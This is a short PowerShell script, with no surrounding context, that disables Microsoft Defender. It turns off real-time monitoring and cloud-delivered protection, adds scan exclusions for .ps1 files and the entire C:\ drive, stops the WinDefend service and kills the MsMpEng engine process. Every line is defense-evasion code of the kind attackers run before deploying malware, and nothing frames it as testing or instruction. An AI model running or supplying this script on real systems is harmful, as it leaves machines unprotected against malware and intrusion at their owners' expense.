# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable cloud-delivered protection
Set-MpPreference -MAPSReporting 0
# Modify exclusions - Extensions & Paths 
Set-MpPreference -ExclusionExtension "ps1" -ExclusionPath "C:\"
Stop-Service -Name "WinDefend"
Stop-Process -Name "MsMpEng"
